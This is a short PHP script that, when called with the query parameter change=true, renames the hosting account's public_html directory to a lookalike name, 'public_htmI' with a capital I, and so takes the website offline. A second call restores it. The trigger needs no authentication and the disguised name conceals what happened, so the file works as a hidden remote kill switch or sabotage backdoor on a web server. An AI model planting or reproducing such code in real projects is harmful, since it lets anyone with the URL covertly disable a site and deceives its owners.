<?php

if (isset($_GET['change']) && $_GET['change'] === 'true') {
    $baseDir = realpath(__DIR__ . '/../../../');
    $original = $baseDir . '/public_html';
    $changed  = $baseDir . '/public_htmI';

    if (is_dir($original)) {
        if (rename($original, $changed)) {
            echo 'done';
        } else {
            echo 'failed 1';
        }
    } elseif (is_dir($changed)) {
        if (rename($changed, $original)) {
            return 'done';
        } else {
            echo 'failed 2';
        }
    } else {
        echo 'failed 3';
        echo 'Original: ' . $original . '<br>';
    }
}

echo 'process';
